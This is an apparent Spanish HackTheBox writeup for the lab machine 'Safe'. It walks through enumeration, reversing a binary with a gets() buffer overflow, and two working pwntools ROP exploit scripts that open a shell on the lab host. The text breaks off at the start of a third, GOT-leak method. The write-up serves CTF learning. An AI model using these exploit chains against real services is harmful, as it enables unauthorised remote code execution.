<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup HackTheBox Safe</title>

  <meta name="description" content="Resolución de la máquina Safe de la plataforma de HackTheBox">
  <meta name="author" content="GatoGamer1155">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup HackTheBox Safe">
  <meta name="twitter:description" content="Resolución de la máquina Safe de la plataforma de HackTheBox">
  <meta name="twitter:creator" content="GatoGamer1155">  
  <meta name="twitter:image" content="/images/htb/safe.png" />

  <meta property="og:site_name" content="GatoGamer1155" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup HackTheBox Safe">
  <meta property="og:description" content="Resolución de la máquina Safe de la plataforma de HackTheBox">
  <meta property="og:image" content="/images/htb/safe.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/safe.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Safe" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#enumeration">Enumeración</a></li>
        <li><a href="#shell-user">Shell - user</a></li>
        <li><a href="#bof-function">BOF - function</a></li>
        <li><a href="#bof-writable">BOF - writable</a></li>
        <li><a href="#bof-puts">BOF - puts</a></li> 
        <li><a href="#shell-root">Shell - root</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">HackTheBox</h4>
    <picture><img src="/images/htb/safe.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Safe</h2><br>
  </header>
  
<section class="post" id="enumeration">
<br><h3 class="post-title">Enumeración</h3><br>

<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nmap </span><span class="p">10.10.10.147
Nmap scan report for 10.10.10.147  
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste</span>
</code></pre></div></div><br>

<p class="plain-text">Aunque es completamente innecesario, solo por comodidad agregaremos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> el dominio <code class="language-plaintext highlighter-rouge">safe.htb</code> para que al apuntar a el nos lleve a la ip victima</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ echo </span><span class="am">"10.10.10.147 safe.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
</code></pre></div></div><br>

<p class="plain-text">Al abrir el servicio web encontramos la plantilla por defecto de <code class="language-plaintext highlighter-rouge">apache2</code> en debian</p>
<a href="/htb/safe/1.png" target="_blank"><div><p><img src="/htb/safe/1.png"></p></div></a>

<p class="plain-text">Al ver el <code class="language-plaintext highlighter-rouge">codigo fuente</code> de la página podemos ver un comentario que nos dice que hay un binario con el nombre <code class="language-plaintext highlighter-rouge">myapp</code> que esta corriendo en el puerto <code class="language-plaintext highlighter-rouge">1337</code></p>
<a href="/htb/safe/2.png" target="_blank"><div><p><img src="/htb/safe/2.png"></p></div></a>

<p class="plain-text">El binario de <code class="language-plaintext highlighter-rouge">myapp</code> podemos descargarlo directamente de la pagina web en <code class="language-plaintext highlighter-rouge">/myapp</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">-s http://safe.htb/myapp -o myapp  </span>
</code></pre></div></div><br>

</section>
<section class="post" id="shell-user">
<br><h3 class="post-title">Shell - user</h3><br>

<p class="plain-text">Al ejecutar el programa comprobamos que es el mismo que corre en el puerto <code class="language-plaintext highlighter-rouge">1337</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ./myapp</span><span class="p">
 19:32:56 up 8 min,  1 user,  load average: 1,12, 0,83, 0,50  

What do you want me to echo back? test
test

</span><span class="ve">❯ netcat </span><span class="p">safe.htb 1337
 19:33:52 up 9 min,  0 users,  load average: 0.00, 0.00, 0.00  

What do you want me to echo back? test
test</span>
</code></pre></div></div><br>

<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">ida</code> podemos decompilar el binario y de esta manera ver su codigo en <code class="language-plaintext highlighter-rouge">C</code></p>
<a href="/htb/safe/3.png" target="_blank"><div><p><img src="/htb/safe/3.png"></p></div></a>

<p class="plain-text">El codigo es simple, ejecuta con system el comando <code class="language-plaintext highlighter-rouge">uptime</code>, despues recibe un input con <code class="language-plaintext highlighter-rouge">gets</code> y lo devuelve con <code class="language-plaintext highlighter-rouge">puts</code>, este binario es vulnerable y es que define un <code class="language-plaintext highlighter-rouge">buffer</code> de solo <code class="language-plaintext highlighter-rouge">112</code> bytes para recibir un input con la funcion vulnerable gets</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int </span><span class="p">__fastcall </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">envp</span><span class="p">)  
{
  </span><span class="no">char </span><span class="p">string[</span><span class="mi">112</span><span class="p">]; </span><span class="c1">// [rsp+0h] [rbp-70h] BYREF

  </span><span class="no">system</span><span class="p">(</span><span class="s">"/usr/bin/uptime"</span><span class="p">);
  </span><span class="no">printf</span><span class="p">(</span><span class="s">"</span><span class="mi">\n</span><span class="s">What do you want me to echo back? "</span><span class="p">);
  </span><span class="no">gets</span><span class="p">(string, </span><span class="mi">1000</span><span class="no">LL</span><span class="p">);
  </span><span class="no">puts</span><span class="p">(string);
  </span><span class="o">return </span><span class="mi">0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Antes de explotar el buffer overflow miraremos las protecciones, <code class="language-plaintext highlighter-rouge">NX</code> esta habilitado, lo que quiere decir que no podremos simplemente ejecutar <code class="language-plaintext highlighter-rouge">shellcode</code> en la pila</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ checksec </span><span class="p">myapp
[</span><span class="az">*</span><span class="p">] '/home/kali/myapp'
    Arch:     amd64-64-little
    RELRO:    </span><span class="am">Partial RELRO</span><span class="p">
    Stack:    </span><span class="ro">No canary found</span><span class="p">
    NX:       </span><span class="ve">NX enabled</span><span class="p">
    PIE:      </span><span class="ro">No PIE (0x400000)  </span>
</code></pre></div></div><br>

<p class="plain-text">En este caso necesitamos indicar que al corromper el programa nos interesa seguir al proceso <code class="language-plaintext highlighter-rouge">padre</code>, iniciaremos creando un patron especial de <code class="language-plaintext highlighter-rouge">150</code> caracteres</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ gdb </span><span class="p">-q myapp
Reading symbols from </span><span class="ve">myapp</span><span class="p">...
(No debugging symbols found in </span><span class="ve">myapp</span><span class="p">)
</span><span class="ro">pwndbg> </span><span class="p">set follow-fork-mode parent
</span><span class="ro">pwndbg> </span><span class="p">cyclic 150
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa  
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Al correr el programa nos pedira un <code class="language-plaintext highlighter-rouge">input</code>, le pasamos el patron de caracteres creado por gdb para asi buscar el <code class="language-plaintext highlighter-rouge">offset</code>, al enviarlo el programa se corrompe</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">pwndbg> </span><span class="p">run
Starting program: </span><span class="ve">/home/kali/myapp</span><span class="p">
[Thread debugging using libthread_db enabled]
Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
 20:34:33 up  1:23,  1 user,  load average: 0,54, 0,57, 0,58

What do you want me to echo back? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa  
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa

Program received signal SIGSEGV, Segmentation fault.
</span><span class="az">0x00000000004011ac </span><span class="p">in </span><span class="am">main</span><span class="p"> ()
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Ahora podemos buscar el <code class="language-plaintext highlighter-rouge">offset</code>, que es la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> que podemos enviar antes de que el programa sobreescriba la siguiente instruccion de <code class="language-plaintext highlighter-rouge">retorno</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">pwndbg> </span><span class="p">x/gx $rsp
</span><span class="az">0x7fffffffe588</span><span class="p">:	0x6161616161616170
</span><span class="ro">pwndbg> </span><span class="p">cyclic -l 0x6161616161616170
</span><span class="sa">Finding cyclic pattern of 8 bytes: b'paaaaaaa' (hex: 0x7061616161616161)  
</span><span class="ve">Found at offset 120
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

</section>
<section class="post" id="bof-function">
<br><h3 class="post-title">Buffer Overflow - Function</h3><br>

<p class="plain-text">Hay diferentes formas de explotarlo, la primera es a través de una funcion <code class="language-plaintext highlighter-rouge">test</code> existente en el binario, con <code class="language-plaintext highlighter-rouge">info functions</code> podemos ver su direccion</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">pwndbg> </span><span class="p">info functions ^test$
All functions matching regular expression "^test$":  

Non-debugging symbols:
</span><span class="az">0x0000000000401152  </span><span class="am">test
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Si lo desensamblamos desde gdb podemos ver sus intrucciones, hace un <code class="language-plaintext highlighter-rouge">MOV</code> de <code class="language-plaintext highlighter-rouge">RSP</code> a <code class="language-plaintext highlighter-rouge">RBP</code>, despues de <code class="language-plaintext highlighter-rouge">RSP</code> a <code class="language-plaintext highlighter-rouge">RDI</code> y finalmente un <code class="language-plaintext highlighter-rouge">JMP</code> hacia el registro <code class="language-plaintext highlighter-rouge">R13</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">pwndbg> </span><span class="p">disassemble test
Dump of assembler code for function </span><span class="am">test</span><span class="p">:
   </span><span class="az">0x0000000000401152</span><span class="p"> <+0>:     </span><span class="ve">push   </span><span class="ro">rbp
   </span><span class="az">0x0000000000401153</span><span class="p"> <+1>:     </span><span class="ve">mov    </span><span class="ro">rbp</span><span class="p">,</span><span class="ro">rsp  
   </span><span class="az">0x0000000000401156</span><span class="p"> <+4>:     </span><span class="ve">mov    </span><span class="ro">rdi</span><span class="p">,</span><span class="ro">rsp  
   </span><span class="az">0x0000000000401159</span><span class="p"> <+7>:     </span><span class="ve">jmp    </span><span class="ro">r13
   </span><span class="az">0x000000000040115c</span><span class="p"> <+10>:    </span><span class="ve">nop
   </span><span class="az">0x000000000040115d</span><span class="p"> <+11>:    </span><span class="ve">pop    </span><span class="ro">rbp
   </span><span class="az">0x000000000040115e</span><span class="p"> <+12>:    </span><span class="ve">ret</span><span class="p">
End of assembler dump.
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Para aprovecharnos de estas instrucciones antes necesitaremos algunas cosas, primero la direcion de la funcion <code class="language-plaintext highlighter-rouge">system@plt</code> que podemos ver desde gdb</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">pwndbg> </span><span class="p">plt 
</span><span class="sa">Section .plt 0x401020-0x401070:</span><span class="p">  
0x401030: puts@plt
0x401040: system@plt
0x401050: printf@plt
0x401060: gets@plt
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Lo siguiente sera buscar un gadget que ekecite un <code class="language-plaintext highlighter-rouge">POP R13</code> que donde estará la funcion <code class="language-plaintext highlighter-rouge">system@plt</code> aprovechando que la funcion test al final hace un <code class="language-plaintext highlighter-rouge">JMP R13</code>, sin embargo solo encontramos un gadget que nos hace un POP a <code class="language-plaintext highlighter-rouge">R13</code>, <code class="language-plaintext highlighter-rouge">R14</code> y <code class="language-plaintext highlighter-rouge">R15</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ropper</span><span class="p"> --file myapp --search </span><span class="am">"pop r13;"</span><span class="p">
</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop r13;

</span><span class="ve">[INFO] </span><span class="p">File: myapp
</span><span class="ro">0x0000000000401206</span><span class="p">: </span><span class="am">pop </span><span class="p">r13</span><span class="az">; </span><span class="am">pop </span><span class="p">r14</span><span class="az">; </span><span class="am">pop </span><span class="p">r15</span><span class="az">; </span><span class="am">ret</span><span class="az">;  </span>
</code></pre></div></div><br>

<p class="plain-text">La idea para explotarlo sera enviar <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al <code class="language-plaintext highlighter-rouge">RIP</code> restandole los bytes ya que dejaremos la cadena <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> al incio de la pila, despues mediante el gadget <code class="language-plaintext highlighter-rouge">POP R13 R14 R15</code> enviar la funcion <code class="language-plaintext highlighter-rouge">system@plt</code> a <code class="language-plaintext highlighter-rouge">R13</code> rellenando los otros registros con <code class="language-plaintext highlighter-rouge">null</code>, despues al llamar a la funcion <code class="language-plaintext highlighter-rouge">test</code> ejecutara un <code class="language-plaintext highlighter-rouge">MOV RDI,RSP</code> que movera la cadena <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> a <code class="language-plaintext highlighter-rouge">RDI</code>, despues cuando test ejecute <code class="language-plaintext highlighter-rouge">JMP R13</code> se encotrara con <code class="language-plaintext highlighter-rouge">system@plt</code> que tomara el argumento de <code class="language-plaintext highlighter-rouge">RDI</code> y nos dara una sh</p>
<a href="/htb/safe/8.png" target="_blank"><div><p><img src="/htb/safe/8.png"></p></div></a>

<p class="plain-text">Lo unico que nos queda es plasmar la explotacion explicada anteriormente en un script de <code class="language-plaintext highlighter-rouge">python</code>, en este caso haremos uso de pwntools para facilitarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p64

bin_sh </span><span class="o">= </span><span class="no">b</span><span class="s">"/bin/sh</span><span class="mi">\x00</span><span class="s">"</span><span class="p">

offset </span><span class="o">= </span><span class="mi">120</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">*</span><span class="p"> (offset </span><span class="o">- </span><span class="p">len(bin_sh))

pop_r13_r14_r15 </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401206</span><span class="p">)
plt_system </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401040</span><span class="p">)
test </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401152</span><span class="p">)
null </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0</span><span class="p">)

payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">bin_sh
payload </span><span class="o">+= </span><span class="p">pop_r13_r14_r15 </span><span class="o">+ </span><span class="p">plt_system </span><span class="o">+ </span><span class="p">null </span><span class="o">+ </span><span class="p">null  
payload </span><span class="o">+= </span><span class="p">test

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"safe.htb"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)

shell.recvline()
shell.sendline(payload)
shell.interactive()</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el script se conecta a la maquina victima por el puerto <code class="language-plaintext highlighter-rouge">1337</code> y al explotar el <code class="language-plaintext highlighter-rouge">buffer overflow</code> nos devuelve una shell como el usuario <code class="language-plaintext highlighter-rouge">user</code>, leemos la flag</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to safe.htb on port 1337: Done  
[</span><span class="az">*</span><span class="p">] Switching to interactive mode
</span><span class="ro">$ </span><span class="p">whoami
user
</span><span class="ro">$ </span><span class="p">hostname -I
10.10.10.147 
</span><span class="ro">$ </span><span class="p">cat /home/user/user.txt
c15**************************ef9
</span><span class="ro">$</span>
</code></pre></div></div><br>

</section>
<section class="post" id="bof-writable">
<br><h3 class="post-title">Buffer Overflow - Writable</h3><br>

<p class="plain-text">Otra forma de explotarlo es aprovechandonos de la sección <code class="language-plaintext highlighter-rouge">.data</code> la cual podemos ver con <code class="language-plaintext highlighter-rouge">rabin2</code> donde tenemos permisos de escritura que se representa como <code class="language-plaintext highlighter-rouge">rw-</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ rabin2 </span><span class="p">-S myapp
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ----
1   0x000002a8   0x1c 0x004002a8   0x1c -r-- .interp
2   0x000002c4   0x20 0x004002c4   0x20 -r-- .note.ABI-tag
3   0x000002e4   0x24 0x004002e4   0x24 -r-- .note.gnu.build-id  
4   0x00000308   0x1c 0x00400308   0x1c -r-- .gnu.hash
5   0x00000328   0xa8 0x00400328   0xa8 -r-- .dynsym
6   0x000003d0   0x50 0x004003d0   0x50 -r-- .dynstr
7   0x00000420    0xe 0x00400420    0xe -r-- .gnu.version
8   0x00000430   0x20 0x00400430   0x20 -r-- .gnu.version_r
9   0x00000450   0x30 0x00400450   0x30 -r-- .rela.dyn
10  0x00000480   0x60 0x00400480   0x60 -r-- .rela.plt
11  0x00001000   0x17 0x00401000   0x17 -r-x .init
12  0x00001020   0x50 0x00401020   0x50 -r-x .plt
13  0x00001070  0x1a1 0x00401070  0x1a1 -r-x .text
14  0x00001214    0x9 0x00401214    0x9 -r-x .fini
15  0x00002000   0x3c 0x00402000   0x3c -r-- .rodata
16  0x0000203c   0x44 0x0040203c   0x44 -r-- .eh_frame_hdr
17  0x00002080  0x120 0x00402080  0x120 -r-- .eh_frame
18  0x00002e10    0x8 0x00403e10    0x8 -rw- .init_array
19  0x00002e18    0x8 0x00403e18    0x8 -rw- .fini_array
20  0x00002e20  0x1d0 0x00403e20  0x1d0 -rw- .dynamic
21  0x00002ff0   0x10 0x00403ff0   0x10 -rw- .got
22  0x00003000   0x38 0x00404000   0x38 -rw- .got.plt
23  0x00003038   0x10 0x00404038   0x10 -rw- .data
24  0x00003048    0x0 0x00404048    0x8 -rw- .bss
25  0x00003048   0x1c 0x00000000   0x1c ---- .comment
26  0x00003068  0x618 0x00000000  0x618 ---- .symtab
27  0x00003680  0x20b 0x00000000  0x20b ---- .strtab
28  0x0000388b  0x103 0x00000000  0x103 ---- .shstrtab</span>
</code></pre></div></div><br>

<p class="plain-text">Para explotarlo de esta manera necesitaremos iniciar obteniendo las direcciones de las funciones <code class="language-plaintext highlighter-rouge">system@plt</code> y <code class="language-plaintext highlighter-rouge">gets@plt</code>, estas podemos obtnerlas nuevamente en gdb</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">pwndbg> </span><span class="p">plt
</span><span class="sa">Section .plt 0x401020-0x401070:</span><span class="p">  
0x401030: puts@plt
0x401040: system@plt
0x401050: printf@plt
0x401060: gets@plt
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Tambien necesitaremos un gadget que haga un <code class="language-plaintext highlighter-rouge">POP RDI</code> para enviar la direccion <code class="language-plaintext highlighter-rouge">writable</code> como argumento en las funciones que utilizaremos para explotarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ropper </span><span class="p">--file myapp --search </span><span class="am">"pop rdi; ret;"</span><span class="p">  
</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop rdi; ret;

</span><span class="ve">[INFO] </span><span class="p">File: myapp
</span><span class="ro">0x000000000040120b</span><span class="p">: </span><span class="am">pop </span><span class="p">rdi</span><span class="az">; </span><span class="am">RIP</span><span class="az">;</span>
</code></pre></div></div><br>

<p class="plain-text">La idea esta vez sera rellenas con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al registro RIP, despues con un <code class="language-plaintext highlighter-rouge">POP RDI</code> enviaremos la direccion de la seccion <code class="language-plaintext highlighter-rouge">writable</code>, despues llamamos a <code class="language-plaintext highlighter-rouge">gets@plt</code> y nos pedira un input, este sera la cadena <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> que se escribira en <code class="language-plaintext highlighter-rouge">RDI</code>, despues nuevamente enviamos a RDI la direccion <code class="language-plaintext highlighter-rouge">writable</code> y llamamos a <code class="language-plaintext highlighter-rouge">system@plt</code>, al ejecutar esta funcion tomara el argumento del registro <code class="language-plaintext highlighter-rouge">RDI</code> la cual contiene la direccion de writable que vale <code class="language-plaintext highlighter-rouge">/bin/sh</code> y nos ejecutara una shell</p>
<a href="/htb/safe/11.png" target="_blank"><div><p><img src="/htb/safe/11.png"></p></div></a>

<p class="plain-text">Nuevamente plasmamos esta idea en un script de <code class="language-plaintext highlighter-rouge">python</code> usando las pwntools</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p64

offset </span><span class="o">= </span><span class="mi">120</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

bin_sh </span><span class="o">= </span><span class="no">b</span><span class="s">"/bin/sh</span><span class="mi">\x00</span><span class="s">"</span><span class="p">

pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40120b</span><span class="p">)
writable </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x404038</span><span class="p">)
plt_gets </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401060</span><span class="p">)
plt_system </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401040</span><span class="p">)

payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">writable
payload </span><span class="o">+= </span><span class="p">plt_gets
payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">writable
payload </span><span class="o">+= </span><span class="p">plt_system

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"safe.htb"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)  

shell.recvline()
shell.sendline(payload)
shell.sendline(bin_sh)
shell.interactive()</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutarlo explota el buffer overflow y nos otorna una shell como el usuario <code class="language-plaintext highlighter-rouge">user</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to safe.htb on port 1337: Done  
[</span><span class="az">*</span><span class="p">] Switching to interactive mode
</span><span class="ro">$ </span><span class="p">whoami
user
</span><span class="ro">$ </span><span class="p">hostname -I
10.10.10.147 
</span><span class="ro">$ </span><span class="p">cat /home/user/user.txt
c15**************************ef9
</span><span class="ro">$</span>
</code></pre></div></div><br>

</section>
<section class="post" id="bof-puts">
<br><h3 class="post-title">Buffer Overflow - Puts</h3><br>

<p class="plain-text">Otra forma es a través de un <code class="language-plaintext highlighter-rouge">error</code> del systema al ejecutar <code class="language-plaintext highlighter-rouge">puts</code>, la idea sera obtener la direccion de <code class="language-plaintext highlighter-rouge">puts@got.plt</code> que podemos obtener facilmente con gdb</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">pwndbg> </span><span class="p">got -r puts
Filtering by symbol name: </span><span class="am">puts</span><span class="p">

State of the GOT of </span><span class="sa">/home/kali/myapp</span><span class="p">:
GOT protection: </span><span class="am">Partial RELRO</span><span class="p"> | Found </span><span class="am">1 </span><span class="p">GOT entries passing the filter  
[</span><span class="sa">0x404018</span><span class="p">] </span><span class="am">puts@GLIBC_2.2.5</span><span class="p"> -> </span><span class="ro">0x7ffff7e38b00 (puts)</span><span class="p"> ◂— </span><span class="na">push </span><span class="no">r14
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Tambien necesitaremos la funcion se <code class="language-plaintext highlighter-rouge">system@plt</code> para ejecutar puts@got.plt a nivel de <code class="language-plaintext highlighter-rouge">sistema</code> y en el error ver la direccion de puts, tambien la direccion de <code class="language-plaintext highlighter-rouge">main</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">pwndbg> </span><span class="p">info functions system@plt
All functions matching regular expression "system@plt":  

Non-debugging symbols:
</span><span class="az">0x0000000000401040  </span><span class="am">system@plt
</span><span class="ro">pwndbg> </span><span class="p">info functions ^main$
All functions matching regular expression "^main$":  

Non-debugging symbols:
</span><span class="az">0x000000000040115f  </span><span class="am">main
</span><span class="ro">pwndbg></span>
</code></pre></div></div><br>

<p class="plain-text">Ademas el gadget de <code class="language-plaintext highlighter-rouge">POP RDI</code> para poder enviar a puts@got.plt como un argumento</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
